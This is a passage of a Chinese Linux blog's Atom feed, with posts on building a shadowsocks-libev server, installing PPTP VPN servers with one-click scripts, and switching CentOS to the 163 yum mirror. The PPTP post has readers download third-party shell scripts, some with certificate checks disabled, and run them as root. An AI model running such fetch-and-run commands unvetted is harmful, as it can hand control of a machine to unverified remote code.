    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>本来想架设的是ipsec的但是测试好多次都有各种问题 小菜我实在弄不明白</p>
<p>明明都能连接了 但只能访问20来秒。。好多机子上都是这样 感觉是资料太老了 要不就是机房封掉了协议</p>
<p>只有换方法shadowsocks总是行的</p>
<h2 id="CentOS、Debian下搭建shadowsocks-libev服务端"><a href="#CentOS、Debian下搭建shadowsocks-libev服务端" class="headerlink" title="CentOS、Debian下搭建shadowsocks-libev服务端"></a>CentOS、Debian下搭建shadowsocks-libev服务端</h2><p><span style="color: #ff0000;">centos</span> yum install build-essential autoconf libtool openssl-devel gcc -y<br><span style="color: #ff0000;">debain</span> apt-get install build-essential autoconf libtool libss-dev gcc -y</p>
<p>yum install git -y<br>apt-get install git -y</p>
<p><div id="crayon-55becbd30c013105258886-1" class="crayon-line">git clone <a href="https://github.com/madeye/shadowsocks-libev.git" target="_blank" rel="external">https://github.com/madeye/shadowsocks-libev.git</a></div></p>
<p><div id="crayon-55becbd30c013105258886-2" class="crayon-line crayon-striped-line">cd shadowsocks-libev</div></p>
<p><div class="crayon-line crayon-striped-line"> ./configure</div></p>
<p><div class="crayon-line crayon-striped-line"> make &amp;&amp; make install</div><br>比如：nohup /usr/local/bin/ss-server -s 自己的ip -p 端口 -k 密码 -m aes-256-cfb &amp;</p>
<p>加入开机启动</p>
<p>echo “nohup /usr/local/bin/ss-server -s 自己的ip -p 端口 -k 密码 -m aes-256-cfb &amp;”&gt;&gt;/etc/rc.local</p>
<p>&nbsp;</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本来想架设的是ipsec的但是测试好多次都有各种问题 小菜我实在弄不明白&lt;/p&gt;
&lt;p&gt;明明都能连接了 但只能访问20来秒。。好多机子上都是这样 感觉是资料太老了 要不就是机房封掉了协议&lt;/p&gt;
&lt;p&gt;只有换方法shadowsocks总是行的&lt;/p&gt;
&lt;h2 id=&quot;Cen
    
    </summary>
    
      <category term="kali-linux" scheme="http://www.linux52.com/categories/kali-linux/"/>
    
    
  </entry>
  
  <entry>
    <title>转-板瓦工Debian/Ubuntu PPTP VPN一键安装脚本</title>
    <link href="http://www.linux52.com/2015-10-04-e8-bd-ac-e6-9d-bf-e7-93-a6-e5-b7-a5debianubuntu-pptp-vpn-e4-b8-80-e9-94-ae-e5-ae-89-e8-a3-85-e8-84-9a-e6-9c-ac.html"/>
    <id>http://www.linux52.com/2015-10-04-e8-bd-ac-e6-9d-bf-e7-93-a6-e5-b7-a5debianubuntu-pptp-vpn-e4-b8-80-e9-94-ae-e5-ae-89-e8-a3-85-e8-84-9a-e6-9c-ac.html</id>
    <published>2015-10-04T13:46:27.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>【检查PPP模块】</p>
<p>root帐户，通过SSH登录到你的OpenVZ VPS，敲入：</p>
<p>cat /dev/ppp</p>
<p>如返回下面一行，则表示PPP模块是开启着的。</p>
<p>cat: /dev/ppp: No such device or address</p>
<p>如果不是，唔，联系你的主机商吧，一般都会给开启的；或在SolusVM管理面板中开启，或关闭再重新打开（按键具体叫什么名字忘了，反正是有的，汗～）。<br>【下载并运行脚本】<br>分别运行下面三行：</p>
<p>wget <a href="http://dadi.me/wp-content/uploads/dir/VPN/pptp_ovz_debian.sh" target="_blank" rel="external">http://dadi.me/wp-content/uploads/dir/VPN/pptp_ovz_debian.sh</a></p>
<p>chmod +x pptp_ovz_debian.sh</p>
<p>./pptp_ovz_debian.sh</p>
<p>下面是一些安装选项简介：<br>1) Set up new PoPToP server AND create one user</p>
<h1 id="键入1，回车、则安装PPTP服务，并创建一个用户。"><a href="#键入1，回车、则安装PPTP服务，并创建一个用户。" class="headerlink" title="键入1，回车、则安装PPTP服务，并创建一个用户。"></a>键入1，回车、则安装PPTP服务，并创建一个用户。</h1><p>2) Create additional users</p>
<h1 id="键入2，回车、则添加用户。"><a href="#键入2，回车、则添加用户。" class="headerlink" title="键入2，回车、则添加用户。"></a>键入2，回车、则添加用户。</h1><p>Enter username that you want to create (eg. vpn or dadi.me):</p>
<h1 id="需要创建的VPN登录所需的用户名。"><a href="#需要创建的VPN登录所需的用户名。" class="headerlink" title="需要创建的VPN登录所需的用户名。"></a>需要创建的VPN登录所需的用户名。</h1><p>Specify password that you want the server to use:</p>
<h1 id="对应VPN用户的密码。"><a href="#对应VPN用户的密码。" class="headerlink" title="对应VPN用户的密码。"></a>对应VPN用户的密码。</h1><p>最后输入密码之后就开始自动安装了，或是添加用户。<br>【额外】<br>如果有些网站不能访问，PPTP VPN安装之后，还需要在登录SSH后敲入并运行：</p>
<p>iptables -I FORWARD -p tcp –syn -i ppp+ -j TCPMSS –set-mss 1356</p>
<p>【结语】<br>运行之后，选择2，是添加用户；这一步骤适用于其他脚本安装的PPTP VPN，貌似L2TP也是可以的。</p>
<p>说到添加和管理用户，大地记得Webmin软件也是支持管理的，可以直接通过Web访问控制，添加或删除PPTP VPN用户。也简单，PPTP VPN安装之后，再正常步骤安装Webmin即可；有可能会在之后的文章中出现。<br>注意：这个安装脚本并不能运行在所有的OpenVZ架构的VPS上，大地在BandwagonHost这家的VPS上安装成功。推荐系统环境：Debian 5,6和Ubuntu 11.04。</p>
<p>=======================================================================</p>
<p>debain</p>
<p><pre class="bash">wget –no-check-certificate <a href="https://raw.githubusercontent.com/tennfy/debian_pptp_tennfy/master/debian_pptp_tennfy.sh" target="_blank" rel="external">https://raw.githubusercontent.com/tennfy/debian_pptp_tennfy/master/debian_pptp_tennfy.sh</a><br>chmod a+x debian_pptp_tennfy.sh</pre><br>./debian_pptp_tennfy.sh install</p>
<p>./debian_pptp_tennfy.sh adduser 添加<span class="wp_keywordlink_affiliate"><a href="http://www.tennfy.com/tag/pptp" title="查看 PPTP 中的全部文章" target="_blank" rel="external">PPTP</a></span> VPN账号密码</p>
<p>./debian_pptp_tennfy.sh repaire 如果出现619错误，那么执行</p>
<p>./debian_pptp_tennfy.sh uninstall</p>
<p><strong>注意：<span style="color: #ff0000;">下面</span></strong><span style="color: #ff0000;">脚本仅适用于 CentOS 6</span></p>
<p>&nbsp;</p>
<p>终端里运行以下命令（以root用户运行）：</p>
<p>cd /root<br>wget –no-check-certificate <a href="https://raw.githubusercontent.com/teddysun/across/master/pptp.sh" target="_blank" rel="external">https://raw.githubusercontent.com/teddysun/across/master/pptp.sh</a><br>chmod +x pptp.sh<br>./pptp.sh<br>整个安装过程一般不超过2分钟，甚至30秒搞定。脚本执行到最后会出现以下提示：</p>
<p>PPTP VPN service is installed.<br>ServerIP:your_server_IP<br>Username:vpn<br>Password:random password<br>Welcome to visit: <a href="http://teddysun.com/134.html" target="_blank" rel="external">http://teddysun.com/134.html</a></p>
<p>当然，这是预定义好的一个用户名（vpn）和密码（随机生成的6位字符串），要想增加用户怎么办呢？<br>很简单，用任一文本编辑器打开 /etc/ppp/chap-secrets，按照其中既有的用户格式添加即可。</p>
<p>VPN连接出现619错误的解决办法：<br>用文本编辑器打开/var/log/messages文件，找到这样的错误提示：<br>“GRE: read(fd=6,buffer=8059660,len=8196) from PTY failed: status = -1 error = Input/output error, usually caused by unexpected termination of pppd, check option syntax and pppd logs”<br>“CTRL: GRE read or PTY write failed (gre,pty)=(7,6)”<br>这说明是logwtmp这个配置选项出现问题，编辑/etc/pptpd.conf文件，注释掉logwtmp选项（前面加个#即可注释），重启pptpd服务。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;【检查PPP模块】&lt;/p&gt;
&lt;p&gt;root帐户，通过SSH登录到你的OpenVZ VPS，敲入：&lt;/p&gt;
&lt;p&gt;cat /dev/ppp&lt;/p&gt;
&lt;p&gt;如返回下面一行，则表示PPP模块是开启着的。&lt;/p&gt;
&lt;p&gt;cat: /dev/ppp: No such device o
    
    </summary>
    
      <category term="便宜vps" scheme="http://www.linux52.com/categories/%E4%BE%BF%E5%AE%9Cvps/"/>
    
    
  </entry>
  
  <entry>
    <title>CentOS更改yum源与更新系统</title>
    <link href="http://www.linux52.com/2015-10-04-centos-e6-9b-b4-e6-94-b9yum-e6-ba-90-e4-b8-8e-e6-9b-b4-e6-96-b0-e7-b3-bb-e7-bb-9f.html"/>
    <id>http://www.linux52.com/2015-10-04-centos-e6-9b-b4-e6-94-b9yum-e6-ba-90-e4-b8-8e-e6-9b-b4-e6-96-b0-e7-b3-bb-e7-bb-9f.html</id>
    <published>2015-10-04T12:51:08.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>[1] 首先备份/etc/yum.repos.d/CentOS-Base.repo</p>
<div class="cnblogs_code"><br><pre>mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</pre><br></div><br>[2] 进入yum源配置文件所在文件夹<br><div class="cnblogs_code"><br><pre>[root@localhost yum.repos.d]# cd /etc/yum.repos.d/</pre><br></div><br>[3] 下载163的yum源配置文件，放入/etc/yum.repos.d/(操作前请做好相应备份)<br><div class="cnblogs_code"><br><pre>[root@localhost yum.repos.d]# wget <a href="http://mirrors.163.com/.help/CentOS6-Base-163.repo" target="_blank" rel="external">http://mirrors.163.com/.help/CentOS6-Base-163.repo</a></pre><br></div><br>[4] 运行yum makecache生成缓存<br><div class="cnblogs_code"><br><pre>[root@localhost yum.repos.d]# yum makecache</pre><br></div><br>[5] 更新系统<br><div class="cnblogs_code"><br><pre>[root@localhost yum.repos.d]# yum -y update</pre><br></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[1] 首先备份/etc/yum.repos.d/CentOS-Base.repo&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;&lt;br&gt;&lt;pre&gt;mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/Ce
    
    </summary>
    
      <category term="记录" scheme="http://www.linux52.com/categories/%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
</feed>
